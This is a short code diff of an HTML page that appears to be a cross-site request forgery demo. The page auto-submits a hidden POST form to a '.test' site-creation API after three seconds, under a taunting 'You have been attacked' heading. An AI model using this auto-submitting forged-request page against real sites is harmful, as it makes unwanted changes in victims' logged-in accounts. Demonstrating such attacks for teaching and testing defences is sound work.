@@ -6,17 +6,15 @@
   </head>
   <body>
     <h1>You have been attacked, HA HA HA</h1>
+    <h2>I will help you to create a new site</h2>
 
 
     <form id="csrf-form" method='POST' action="https://tommy-design.test/api/weba/v3/site">
-      <INPUT TYPE="hidden" NAME="redirect" VALUE="https://csrf-demo-app.herokuapp.com/index.html">
     </form>
  
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
     <script type='text/javascript'>
       setTimeout(function(){
         document.getElementById('csrf-form').submit();
-        sleep(2000);
       }, 3000)
     </script>
   </body>
